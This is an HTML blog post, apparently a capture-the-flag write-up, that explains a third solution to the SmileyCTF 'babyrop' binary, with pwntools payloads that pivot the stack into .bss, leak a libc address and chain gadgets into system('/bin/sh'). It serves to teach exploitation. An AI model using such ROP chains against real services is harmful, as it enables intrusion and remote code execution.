@@ -1,0 +1,567 @@
+<!doctype html>
+<html class="not-ready lg:text-base overflow-y-scroll scroll-pt-14" lang="en">
+
+<head prefix="og: https://ogp.me/ns# article: https://ogp.me/ns/article#">
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+  <meta name="generator" content="Zola v0.21.0" />
+  <title>SmileyCTF babyrop Writeup 3 | Dreamer</title>
+  <meta property="og:site_name" content="Dreamer" />
+  <meta property="og:title" content="SmileyCTF babyrop Writeup 3" />
+  <meta name="description" content="Reverse engineering and pwning the SmileyCTF Babyrop challenge binary. Includes LIBC leak and Return-Oriented Programming" />
+  <meta property="og:description" content="Reverse engineering and pwning the SmileyCTF Babyrop challenge binary. Includes LIBC leak and Return-Oriented Programming" />
+  <meta property="og:url" content="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop3/" />
+  <link rel="canonical" href="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop3/" />
+  <meta property="og:type" content="article" />
+  <meta property="article:published_time" content="2025-07-24T00:00:00+00:00" />
+  <meta property="og:image" content="https://ismailbozkurt.github.io/images/SmileyCTF/SmileyCTF-Babyrop-2/smileyCTF_pic.png" />
+  <meta property="og:image:alt" content="Reverse engineering and pwning the SmileyCTF Babyrop challenge binary. Includes LIBC leak and Return-Oriented Programming" />
+  <meta property="og:image:width" content="645" />
+  <meta property="og:image:height" content="147" />
+  <meta property="og:image:type" content="image/png" />
+  <link rel="alternate" type="application/atom+xml" href="https://ismailbozkurt.github.io/atom.xml" title="Dreamer | Atom" />
+  <link rel="license" href="https://creativecommons.org/licenses/by-sa/4.0/deed" />
+  <!-- Begin Head inject -->
+  
+  <!-- End Head inject -->
+  <link rel="stylesheet" href="https://ismailbozkurt.github.io/main.min.css?h=2e89f7f30f1019877d14" />
+  <style>
+  :root{--bg: #f4f4f5; --header: #e4e4e7; color-scheme: light;}
+  :root.dark{--bg: #18181b; --header: #27272a; color-scheme: dark;}
+  </style>
+  <meta name="theme-color" data-light="#e4e4e7" data-dark="#27272a" content="#e4e4e7" />
+  <link rel="icon" type="image/x-icon" sizes="16x16" href="https://ismailbozkurt.github.io/favicon.ico" />
+  <link rel="apple-touch-icon" type="image/png" href="https://ismailbozkurt.github.io/apple-touch-icon.png?h=58bee300054c5308feb3" />
+  <link rel="icon" type="image/png" href="https://ismailbozkurt.github.io/android-icon.png?h=8d80ec95446bd2c36826" />
+  <script src="https://ismailbozkurt.github.io/js/linkita.min.js?h=1dd3ed42fc674277bc34"></script>
+  <script src="https://ismailbozkurt.github.io/js/linkita-search.min.js?h=698547b4b081d012c661"></script>
+  <!-- Begin Head End inject -->
+  <!-- Umami analytics -->
+<script defer src="https://cloud.umami.is/script.js" data-website-id="3da49f88-7825-49a6-b9cf-de0c7610e7dc"></script>
+
+<!-- Custom CSS -->
+<link rel="stylesheet" href="https://ismailbozkurt.github.io/files/custom.css">
+
+<!-- HEAD END -->
+
+  <!-- End Head End inject -->
+</head>
+
+<body class="text-black duration-100 ease-out bg-[var(--bg)] dark:text-white">
+  <!-- Header -->
+<header class="bg-[var(--header)] fixed top-0 z-40 mx-auto min-h-[3.25rem] w-full header-icons">
+  <div class="mx-auto w-full max-w-4xl p-2.5 lg:flex lg:justify-between">
+    <div class="flex justify-between">
+      <div class="flex items-center min-h-8">
+        <a title="Go to home page" accesskey="!"
+          href="https://ismailbozkurt.github.io/" class="text-2xl font-semibold">Dreamer</a>
+        <button type="button" title="Switch color scheme" accesskey="$"
+          onclick="window.linkita.toggleDarkMode();" ondblclick="window.linkita.resetDarkMode();"
+          class="btn-dark ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] bg-center bg-no-repeat bg-cover dark:invert [background-image:var(--icon-theme-dark)] dark:[background-image:var(--icon-theme-light)]"
+        ></button>
+        <button type="button" title="Search" accesskey="/"
+          onclick="window.linkita.toggleSearch();"
+          class="btn-search ml-4 h-6 w-6 shrink-0 cursor-pointer text-[0] bg-center bg-no-repeat bg-cover [background-image:var(--icon-search)] dark:invert"
+        ></button>
+        <script>window.linkita.initSearchButton({ scripts: ["https://ismailbozkurt.github.io/elasticlunr.min.js", "https://ismailbozkurt.github.io/search_index.en.js"] });</script>
+      </div>
+      <div title="Menu" role="button" accesskey="+" tabindex="0"
+        class="btn-menu relative z-50 flex h-8 w-8 shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
+        onclick="window.linkita.toggleHeaderMenu();"
+        onkeydown="(event.keyCode == 13 || event.keyCode == 32) ? event.preventDefault() || window.linkita.toggleHeaderMenu() : true;"
+      ></div>
+    </div>
+    <nav class="flex w-full items-center lg:w-auto">
+      <menu
+        class="nav-wrapper flex w-full flex-col py-2 lg:w-auto lg:flex-row lg:self-center lg:py-0">
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://ismailbozkurt.github.io/infosec_notes"
+          >Infosec-Notes</a>
+        </li>
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://ismailbozkurt.github.io/posts"
+          >Posts</a>
+        </li>
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://ismailbozkurt.github.io/about"
+          >About</a>
+        </li>
+        <li>
+          <a
+            class="primary-link block py-2 text-center text-lg font-medium lg:px-3 lg:py-0"
+            href="https://ismailbozkurt.github.io/n2myself"
+          >Note2Myself</a>
+        </li>
+      </menu>
+      <!-- Begin Header Nav inject -->
+      
+      <!-- End Header Nav inject -->
+    </nav>
+  </div>
+</header>
+
+  <!-- Begin Body Start inject -->
+  
+  <!-- End Body Start inject -->
+  <main class="prose prose-neutral relative mx-auto min-h-[calc(100%-4rem)]
+    max-w-3xl break-words px-4 pb-12 pt-28 lg:pt-32 dark:prose-invert prose-pre:rounded-lg prose-img:rounded-lg">
+      <!-- Search -->
+<div id="linkita-search-wrapper" class="hidden">
+  <ul id="linkita-search-results"></ul>
+</div>
+
+    
+<article>
+  <!-- Begin Page Start inject -->
+  
+  <!-- End Page Start inject -->
+
+  <header class="mb-16">
+    <h1 class="!my-0 pb-2.5">SmileyCTF babyrop Writeup 3</h1>
+    <!-- Page Info -->
+<div class="text-sm antialiased opacity-80"><time
+      datetime="2025-07-24T00:00:00+00:00">2025-07-24</time><span
+        class="middot"></span><time
+    datetime="PT0H6M0S">6&nbsp;min</time><span
+      class="middot"></span>
+</div>
+
+  </header>
+  <figure class="mb-12 mt-0">
+    <img
+      class="h-auto w-full rounded-lg"
+      src="https://ismailbozkurt.github.io/images/SmileyCTF/SmileyCTF-Babyrop-2/smileyCTF_pic.png"
+      alt="Reverse engineering and pwning the SmileyCTF Babyrop challenge binary. Includes LIBC leak and Return-Oriented Programming"
+      width="645"
+      height="147"
+    />
+  </figure>
+  <!-- TOC -->
+<div class="block-bg mb-12 rounded-lg p-2 text-lg">
+  <details>
+    <summary class="select-none py-0.5 lg:py-1 pl-4" accesskey="=">
+      <span class="cursor-pointer">Table of Contents</span>
+    </summary>
+    <div class="px-2">
+      <ul>
+        <li>
+          <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop3/#quick-recap">Quick recap</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop3/#the-gadgets">The gadgets</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop3/#1st-overflow">1st Overflow</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop3/#2nd-overflow">2nd Overflow</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop3/#the-magic">The magic</a>
+          <ul>
+            <li>
+              <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop3/#what-exactly-happens-here">What exactly happens here ?</a>
+            </li>
+          </ul>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop3/#what-exactly-happened-here">What exactly happened here ?</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop3/#final-3rd-overflow">Final 3rd Overflow</a>
+        </li>
+        <li>
+          <a class="no-underline hover:underline" href="https://ismailbozkurt.github.io/blog/SmileyCTF/smileyctf-babyrop3/#conclusion">Conclusion</a>
+        </li>
+      </ul>
+    </div>
+  </details>
+</div>
+
+  <!-- Content -->
+  <section><p>This is the <strong>third solution</strong> for the SmileyCTF-babyrop challenge, and it's the most satisfying one for me. I like to call it "<strong>playing with memory like a master</strong>."</p>
+<h3 id="quick-recap">Quick recap</h3>
+<p>The PoC owner creates two carefully crafted chunks for this exploit. The first chunk is called the <strong>Chunk Execution Workflow (CEW) chunk</strong>, and the second is the <strong>Chunk Execution Manager (CEM) chunk</strong>.</p>
+<p>I appreciate this PoC because it's <strong>clean, clear, and robust</strong>. The PoC overflows the buffer three times, allowing for significant manipulation of the execution flow. This is what makes it particularly special to me.</p>
+<h3 id="the-gadgets">The gadgets</h3>
+<p>I added some comments to code, hope it would help you to understand.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>offset      = </span><span style="color:#d08770;">0x20        </span><span style="color:#65737e;"># rbp overwrite offset
+</span><span>bss         = </span><span style="color:#d08770;">0x404800    </span><span style="color:#65737e;"># bss address the CEW chunk
+</span><span>
+</span><span>gets_gadget = </span><span style="color:#d08770;">0x401205    </span><span style="color:#65737e;"># 0x401205 &lt;+54&gt;:    lea    rax,[rbp-0x20]
+</span><span>print_gadget = </span><span style="color:#d08770;">0x401211    </span><span style="color:#65737e;"># 0x401211 &lt;+66&gt;:    mov    rdx,QWORD PTR [rip+0x2df8]        # 0x404010 &lt;print&gt;
+</span><span>
+</span><span>leave_ret   = </span><span style="color:#d08770;">0x401226    </span><span style="color:#65737e;"># 0x401226 &lt;+87&gt;:    leave; ret
+</span><span>pop_rbp     = </span><span style="color:#d08770;">0x401181    </span><span style="color:#65737e;"># 0x401181 &lt;gadgets+11&gt;:       pop    rbp; ret
+</span><span>pop_rcx     = </span><span style="color:#d08770;">0x40117e    </span><span style="color:#65737e;"># 0x40117e &lt;gadgets+8&gt;:        pop    rcx
+</span><span>add_bl_dh   = </span><span style="color:#d08770;">0x4010bf    </span><span style="color:#65737e;"># 
+</span><span>ret         = pop_rbp + </span><span style="color:#d08770;">1 </span><span style="color:#65737e;"># ret;
+</span></code></pre>
+<h3 id="1st-overflow">1st Overflow</h3>
+<p>The first overflow is the classic one, preparing <code>rbp</code> at <code>bss-0x10</code> and injecting the CEW payload. This gains control of <code>RIP</code>, directing execution to <code>gets_gadgets</code>.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>payload = </span><span style="color:#bf616a;">flat</span><span>({
+</span><span>    offset: [
+</span><span>        bss-</span><span style="color:#d08770;">0x10</span><span>,   </span><span style="color:#65737e;">#set rbp to 0x4047f0
+</span><span>        gets_gadget </span><span style="color:#65737e;"># rip
+</span><span>    ]
+</span><span>}, </span><span style="color:#bf616a;">filler</span><span>=</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">A</span><span>&#39;)
+</span><span>
+</span><span style="color:#96b5b4;">input</span><span>(&quot;</span><span style="color:#a3be8c;">Payload send set rbp 0x404058</span><span>&quot;)
+</span><span>io.</span><span style="color:#bf616a;">sendline</span><span>(payload)
+</span><span>
+</span><span>log.</span><span style="color:#bf616a;">info</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#a3be8c;">payload 1 output </span><span>{io.</span><span style="color:#bf616a;">recv</span><span>()}&quot;)
+</span></code></pre>
+<h3 id="2nd-overflow">2nd Overflow</h3>
+<p>The second payload, which I've named <strong>CEW (Chunk Execution Workflow)</strong>, handles the execution flow. While it might appear straightforward, there are some clever tricks at play.</p>
+<p>If you look closely, you'll notice that we're calling gadgets within <code>main</code>. So, after <code>gets_gadget</code> is called, the program ultimately executes <code>leave; ret</code> instructions at the end of its execution.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>payload = </span><span style="color:#bf616a;">flat</span><span>({
+</span><span>    offset:[
+</span><span>        </span><span style="color:#d08770;">0x404038 </span><span>+ </span><span style="color:#d08770;">0x20</span><span>,    </span><span style="color:#65737e;">#0x4047f0 new rbp
+</span><span>        gets_gadget,        </span><span style="color:#65737e;">#0x4047f8 new rip
+</span><span>
+</span><span>        </span><span style="color:#d08770;">0x404018 </span><span>+ </span><span style="color:#d08770;">0x20</span><span>,    </span><span style="color:#65737e;">#0x404800
+</span><span>        print_gadget,        </span><span style="color:#65737e;">#0x404808
+</span><span>
+</span><span>        </span><span style="color:#bf616a;">cyclic</span><span>(</span><span style="color:#d08770;">0x10</span><span>),       </span><span style="color:#65737e;">#0x404810 - 0x404818
+</span><span>
+</span><span>        bss + </span><span style="color:#d08770;">0x30 </span><span>+ </span><span style="color:#d08770;">0x20</span><span>,  </span><span style="color:#65737e;">#0x404820
+</span><span>        gets_gadget,        </span><span style="color:#65737e;">#0x404828
+</span><span>
+</span><span>    ]
+</span><span>}, </span><span style="color:#bf616a;">filler</span><span>=</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">B</span><span>&#39;)
+</span><span>
+</span><span style="color:#96b5b4;">input</span><span>(&quot;</span><span style="color:#a3be8c;">Payload 2</span><span>&quot;)
+</span><span>io.</span><span style="color:#bf616a;">sendline</span><span>(payload)
+</span><span>
+</span><span>log.</span><span style="color:#bf616a;">info</span><span>(</span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#a3be8c;">payload 2 output: </span><span>{io.</span><span style="color:#bf616a;">recv</span><span>()}&quot;)
+</span></code></pre>
+<p>This means <code>rsp</code> is no longer on the stack; it will now reside at <code>0x4047f8</code>. The calculation for this is straightforward, but I can explain it further if you're unfamiliar with it.</p>
+<p>The first payload set <code>RBP</code> to <code>0x4048f0</code></p>
+<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/c927709f31605fa32dcf088f6ead3d59.png" alt="c927709f31605fa32dcf088f6ead3d59.png" /></p>
+<p>If we follow the execution up to the <code>leave; ret</code> instruction, <strong><code>rsp</code> will settle at <code>0x4047f8</code> (the new <code>RIP</code>), which is the old <code>rbp + 0x8</code></strong>.</p>
+<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/a5e9f665158dc041f3a187f15c95e13a.png" alt="a5e9f665158dc041f3a187f15c95e13a.png" /></p>
+<p>If we examine the memory layout, the <code>rsp</code> value correctly points to the CEW payload's newly settled <code>RIP</code>. The <code>RSP</code> register has indeed settled to the expected <code>RIP</code>.</p>
+<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/dff3da9ed38255e8b9120d2f909c241b.png" alt="dff3da9ed38255e8b9120d2f909c241b.png" /></p>
+<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/086e0b270146e02573b63f78e8190ef8.png" alt="086e0b270146e02573b63f78e8190ef8.png" /></p>
+<p>As you've noted, the CEW (second) payload overflows the program again. This sets <code>rbp</code> to <code>0x404058</code>. At the end of <code>main</code>, the new <code>RSP</code> value will be <code>0x404060</code>.</p>
+<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/f248a65d7973c4659e87fceb253f7db1.png" alt="f248a65d7973c4659e87fceb253f7db1.png" /></p>
+<h3 id="the-magic">The magic</h3>
+<p>Here's where the magic happens: the <strong>CEM (third) payload</strong>. This carefully crafted payload is responsible for managing the execution flow.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>payload  = </span><span style="color:#bf616a;">p64</span><span>(bss + </span><span style="color:#d08770;">0x20</span><span>)   </span><span style="color:#65737e;"># 0x404038
+</span><span>payload += </span><span style="color:#bf616a;">p64</span><span>(leave_ret)    </span><span style="color:#65737e;"># 0x404040
+</span><span>payload += </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">C</span><span>&#39; * </span><span style="color:#d08770;">0x10       </span><span style="color:#65737e;"># 0x404048 - 0x404050
+</span><span>payload += </span><span style="color:#bf616a;">p64</span><span>(bss)          </span><span style="color:#65737e;"># 0x404058
+</span><span>payload += </span><span style="color:#bf616a;">p64</span><span>(leave_ret)    </span><span style="color:#65737e;"># 0x404060
+</span><span>
+</span><span style="color:#96b5b4;">input</span><span>(&quot;</span><span style="color:#a3be8c;">Payload 3</span><span>&quot;)
+</span><span>io.</span><span style="color:#bf616a;">sendline</span><span>(payload)
+</span><span>
+</span><span>io.</span><span style="color:#bf616a;">recvline</span><span>()
+</span></code></pre>
+<h4 id="what-exactly-happens-here">What exactly happens here ?</h4>
+<p>The memory layout can be seen in the memory clearly.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>(remote) gef➤  x/16xg </span><span style="color:#d08770;">0x404000
+</span><span style="color:#d08770;">0x404000</span><span>:       </span><span style="color:#d08770;">0x0000000000000000      0x0000000000000000
+</span><span style="color:#d08770;">0x404010 </span><span>&lt;</span><span style="color:#b48ead;">print</span><span>&gt;:       </span><span style="color:#d08770;">0x00007fa368d7cbe0      0x00007fa368ef95c0
+</span><span style="color:#d08770;">0x404020 </span><span>&lt;completed</span><span style="color:#d08770;">.0</span><span>&gt;: </span><span style="color:#d08770;">0x0000000000000000      0x0000000000000000
+</span><span style="color:#d08770;">0x404030</span><span>:       </span><span style="color:#d08770;">0x0000000000000000      0x0000000000404820
+</span><span style="color:#d08770;">0x404040</span><span>:       </span><span style="color:#d08770;">0x0000000000401226      0x4343434343434343
+</span><span style="color:#d08770;">0x404050</span><span>:       </span><span style="color:#d08770;">0x4343434343434343      0x0000000000404800
+</span><span style="color:#d08770;">0x404060</span><span>:       </span><span style="color:#d08770;">0x0000000000401226  </span><span>--&gt;here    </span><span style="color:#d08770;">0x0000000000000000
+</span><span style="color:#d08770;">0x404070</span><span>:       </span><span style="color:#d08770;">0x0000000000000000      0x0000000000000000
+</span></code></pre>
+<p>The CEW (second) payload sets <strong><code>RBP</code> to <code>0x404058</code></strong>. By the end of <code>main</code>, <strong><code>RSP</code> becomes <code>0x404060</code> (the new <code>RIP</code>)</strong>, which is the address of the <code>leave; ret</code> instruction.</p>
+<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/3e204f35aaeea3a13081d7b537d648c2.png" alt="3e204f35aaeea3a13081d7b537d648c2.png" /></p>
+<p>So, what's in the stack? The answer is <code>0x404800</code>. After the <code>leave</code> instruction executes, <code>RSP</code> will become <code>0x404068</code>, and <code>RBP</code> will become <code>0x404800</code>.</p>
+<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/68067f2aea922bf58d2face106a0f2ff.png" alt="68067f2aea922bf58d2face106a0f2ff.png" /></p>
+<p>After execution of <code>leave</code></p>
+<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/1ba79462811cf14ce2d84b2a426fa54c.png" alt="1ba79462811cf14ce2d84b2a426fa54c.png" /></p>
+<p>As the screenshot above indicates, another <code>leave; ret</code> instruction appears. Where did it come from? The answer lies in the CEM (third) payload.</p>
+<p><strong>So, where does the execution redirect?</strong></p>
+<p>The math dictates that <code>RSP</code> will become <code>0x404808</code> (the new <code>RIP</code>) before the <code>ret</code> instruction executes. What about the <code>RBP</code> register value? It will become the address inside of <code>$RBP-0x8</code>.</p>
+<ul>
+<li>
+<p>The address <code>0x404800</code> contains <code>0x404038</code>, which is the start of the CEW (second) payload.</p>
+</li>
+<li>
+<p>The execution will redirect to the <code>RSP</code> value, which is <code>0x404808</code> (the new <code>RIP</code>).</p>
+</li>
+<li>
+<p>Which gadget exists inside <code>0x404808</code>? The <code>print_gadget</code> from the CEW (second) payload.</p>
+</li>
+</ul>
+<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/dd8b52422e9ddad8afd9f038a8b2430b.png" alt="dd8b52422e9ddad8afd9f038a8b2430b.png" /></p>
+<h3 id="what-exactly-happened-here">What exactly happened here ?</h3>
+<p>Simply put, the CEM (third) payload redirects execution to the <code>print_gadget</code> (4th index) within the CEW (second) payload, with <code>RBP</code> properly settled at <code>0x404038</code>.</p>
+<p>Let's re-examine what the <code>print_gadget</code> does. As you can see below, it's printing the address <code>0x00007f44f8c675c0</code>, which is the LIBC address of <code>_IO_2_1_stdout_</code>.</p>
+<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/784e635d6dff9459dee2963e4eda4d93.png" alt="784e635d6dff9459dee2963e4eda4d93.png" /></p>
+<p>The calculated <code>LIBC Address</code></p>
+<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/be36f9c1517684db2f9910501cf54693.png" alt="be36f9c1517684db2f9910501cf54693.png" /></p>
+<p>The <code>print_gadget</code> and <code>gets_gadget</code> reside within the <code>main</code> function. This means that each time they are called, we manipulate <code>RSP</code> and <code>RBP</code>.</p>
+<ul>
+<li>
+<p><strong>What was the <code>RBP</code> value?</strong> <code>0x404038</code>.</p>
+</li>
+<li>
+<p><strong>What will <code>RBP</code> become?</strong> The address contained within <code>0x404038</code>, which is the start of the CEM (third) payload: <code>0x404820</code>.</p>
+</li>
+<li>
+<p><strong>What will <code>RSP</code> become?</strong> <code>0x404040</code> (the new <code>RIP</code>), which points to the CEM (third) payload's second index, specifically <code>leave_ret</code>.</p>
+</li>
+</ul>
+<p>This is precisely why I named the third payload "Chunk Execution Manager." Its sole purpose is to redirect execution precisely where the attacker desires.</p>
+<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/e164f0188cafcfd2051b1ecad61553ce.png" alt="e164f0188cafcfd2051b1ecad61553ce.png" /></p>
+<p>Let's break down what happens after the <code>leave</code> instruction executes, based on your provided information:</p>
+<ul>
+<li>
+<p><strong><code>RBP</code> will become <code>0x404850</code></strong>. This value, which was originally at <code>0x404820</code> (the location <code>RBP</code> pointed to just before <code>leave</code>), now points to the 5th index of the CEW (second) payload.</p>
+</li>
+<li>
+<p><strong><code>RSP</code> will become <code>0x404828</code> (the new <code>RIP</code>)</strong>. This means the execution flow will jump to the 6th index of the CEW (second) payload, which you've indicated is the <code>gets_gadget</code>.</p>
+</li>
+</ul>
+<p>In essence, the <code>leave</code> instruction is facilitating a transition, directing both <code>RBP</code> and <code>RSP</code> to new locations that will guide the subsequent execution flow. The <code>RBP</code> is set up to point to a specific part of the CEW payload, while <code>RSP</code> is now poised to execute the <code>gets_gadget</code> from that same payload.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>(remote) gef➤  x/16xg </span><span style="color:#d08770;">0x4047d0
+</span><span style="color:#d08770;">0x4047d0</span><span>:       </span><span style="color:#d08770;">0x0000000000000001      0x00007ffd67a78fd8
+</span><span style="color:#d08770;">0x4047e0</span><span>:       </span><span style="color:#d08770;">0x0000000000000001      0x0000000000000000
+</span><span style="color:#d08770;">0x4047f0</span><span>:       </span><span style="color:#d08770;">0x0000000000403dc8      0x00007ff222e6c000
+</span><span style="color:#d08770;">0x404800</span><span>:       </span><span style="color:#d08770;">0x0000000000404038      0x0000000000401221
+</span><span style="color:#d08770;">0x404810</span><span>:       </span><span style="color:#d08770;">0x6161616261616161      0x6161616461616163
+</span><span>
+</span><span style="color:#d08770;">0x404820</span><span>:       </span><span style="color:#d08770;">0x0000000000404850      0x0000000000401205 </span><span>--&gt; here
+</span><span>
+</span><span style="color:#d08770;">0x404830</span><span>:       </span><span style="color:#d08770;">0x0000000000000000      0x0000000000000000
+</span><span style="color:#d08770;">0x404840</span><span>:       </span><span style="color:#d08770;">0x0000000000000000      0x0000000000000000
+</span><span style="color:#d08770;">0x404850</span><span>:       </span><span style="color:#d08770;">0x0000000000000000      0x0000000000000000
+</span><span style="color:#d08770;">0x404860</span><span>:       </span><span style="color:#d08770;">0x0000000000000000      0x0000000000000000
+</span></code></pre>
+<p>The address <code>0x404850</code> is a null memory area within the <code>bss</code> section. The PoC creator ensures that the fourth payload will be placed at this address.</p>
+<p>Remember, the payload calls <code>gets_gadget</code> again! This means that <code>leave_ret</code> will execute once more at the end of the execution.</p>
+<h3 id="final-3rd-overflow">Final 3rd Overflow</h3>
+<p>The final payload is quite straightforward. Using the LIBC base address, it locates the <code>pop rdi; ret</code> gadget, the <code>/bin/sh\0</code> string, and the <code>system</code> gadget.</p>
+<p>The buffer is then overflowed again. Subsequently, <code>RBP</code> is set to <code>0</code>, <code>rdi</code> is set to the "/bin/sh\0" string, <code>RSP</code> is aligned to 8 bytes with a <code>ret</code> gadget, and finally, <code>__libc_system</code> is called.</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>libc.address = </span><span style="color:#bf616a;">u64</span><span>(io.</span><span style="color:#bf616a;">recv</span><span>()[:-</span><span style="color:#d08770;">1</span><span>].</span><span style="color:#bf616a;">ljust</span><span>(</span><span style="color:#d08770;">0x8</span><span>, </span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#96b5b4;">\0</span><span>&#39;)) - </span><span style="color:#d08770;">0x2045c0
+</span><span>log.</span><span style="color:#bf616a;">success</span><span>(&#39;</span><span style="color:#a3be8c;">libc base @ </span><span style="color:#d08770;">%#x</span><span>&#39;, libc.address)
+</span><span>
+</span><span>rop = </span><span style="color:#bf616a;">ROP</span><span>(libc)
+</span><span>pop_rdi = rop.</span><span style="color:#bf616a;">find_gadget</span><span>([&quot;</span><span style="color:#a3be8c;">pop rdi</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">ret</span><span>&quot;])[</span><span style="color:#d08770;">0</span><span>]
+</span><span style="color:#65737e;">#
+</span><span>payload = </span><span style="color:#bf616a;">flat</span><span>({
+</span><span>    offset: [
+</span><span>        </span><span style="color:#d08770;">0</span><span>,        </span><span style="color:#65737e;"># ---------------------&gt; #0x404850
+</span><span>        pop_rdi,  </span><span style="color:#65737e;"># ---------------------&gt; #0x404858
+</span><span>        </span><span style="color:#96b5b4;">next</span><span>(libc.</span><span style="color:#bf616a;">search</span><span>(</span><span style="color:#b48ead;">b</span><span>&#39;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#96b5b4;">\0</span><span>&#39;)),   </span><span style="color:#65737e;">#0x404860
+</span><span>        ret,      </span><span style="color:#65737e;"># ---------------------&gt; #0x404868
+</span><span>        libc.sym.system                    </span><span style="color:#65737e;">#0x404870
+</span><span>    ]
+</span><span>})
+</span><span style="color:#65737e;">#
+</span><span style="color:#96b5b4;">input</span><span>(&quot;</span><span style="color:#a3be8c;">Payload 4</span><span>&quot;)
+</span><span>io.</span><span style="color:#bf616a;">sendline</span><span>(payload)
+</span></code></pre>
+<p>Here's a breakdown of the calculations and their impact on memory:</p>
+<ul>
+<li>
+<p>The last <code>RBP</code> value was <code>0x404850</code>, which marks the start of the 4th payload.</p>
+</li>
+<li>
+<p>The <code>RSP</code> value will become <code>0x404858</code> (the new <code>RIP</code>), pointing to the 2nd index of the 4th payload, which is the <code>pop rdi; ret</code> gadget.</p>
+</li>
+<li>
+<p>The new <code>RBP</code> value is settled to <code>0x0</code>.</p>
+</li>
+</ul>
+<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/ffb88aa181170a92593fa4448a844552.png" alt="ffb88aa181170a92593fa4448a844552.png" /></p>
+<h3 id="conclusion">Conclusion</h3>
+<p>This PoC's payload is <strong>strictly connected and well-structured</strong>. In the world of Return-Oriented Programming (ROP), I typically avoid messing with the <code>RSP</code>, but analyzing this PoC was both fun and great practice.</p>
+<p>As the PoC creator noted, "This is a ROP challenge, so there are many ways to solve it."</p>
+<p><img src="/images/SmileyCTF/SmileyCTF-Babyrop-2/e272caf856fa05702c2f828b6279ceb2.png" alt="e272caf856fa05702c2f828b6279ceb2.png" /></p>
+<p>Credit: <code>lyn</code></p>
+</section>
+  <hr />
+  <!-- Post Taxonomies -->
+
+  <!-- Post Nav -->
+<nav class="block-bg mt-12 flex flex-wrap rounded-lg text-lg">
+  <a
+    class="block-hover-mask flex min-w-[50%] grow items-center rounded-l-md p-6 pr-3 font-semibold no-underline"
+    href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-cypher/" accesskey=","
+    ><span class="mr-1.5">&#8249;</span><span>HackTheBox Cypher Writeup</span></a>
+  <a
+    class="block-hover-mask ml-auto flex min-w-[50%] grow items-center justify-end rounded-r-md p-6 pl-3 font-semibold no-underline"
+    href="https://ismailbozkurt.github.io/blog/HackTheBox/htb-mirage/" accesskey="."
+    ><span>HackTheBox Mirage Writeup</span><span class="ml-1.5">&#8250;</span></a>
+</nav>
+
+  <!-- Begin Page End inject -->
+  
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script>
+<script>
+  mediumZoom('img:not(.no-zoom)', {
+    margin: 24,
+    background: 'rgba(0, 0, 0, 0.9)',
+    scrollOffset: 40,
+  });
+</script>
+<!-- Only runs if .encrypted-content exists -->
